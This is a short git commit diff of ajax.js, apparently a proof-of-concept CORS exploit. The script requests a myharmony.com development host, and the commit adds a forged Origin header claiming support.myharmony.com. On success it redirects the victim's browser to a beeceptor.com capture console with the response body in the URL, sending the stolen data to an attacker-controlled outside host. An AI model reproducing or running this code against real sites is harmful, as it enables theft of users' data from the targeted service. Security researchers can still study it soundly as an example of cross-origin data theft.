6865c96b14f736e6c51249a5f4176cc136e582d9
FadyG0 <89953434+FadyG0@users.noreply.github.com>
2024-07-26 15:22:05 -0400

    Update ajax.js

--- ajax.js
+++ ajax.js
@@ -4,13 +4,13 @@ function run() {
 
     let url = 'https://web-dev03.myharmony.com/';
     xhr.open("GET", url, true);
+    xhr.setRequestHeader('Origin', 'https://support.myharmony.com');
 
     xhr.onreadystatechange = function () {
         if (this.readyState == 4 && this.status == 200) {
            window.location.href = 'https://app.beeceptor.com/console/ergdrf?' + this.responseText ;
         }
-    }
-    // Sending our request 
+    } 
     xhr.send();
 }
 run();
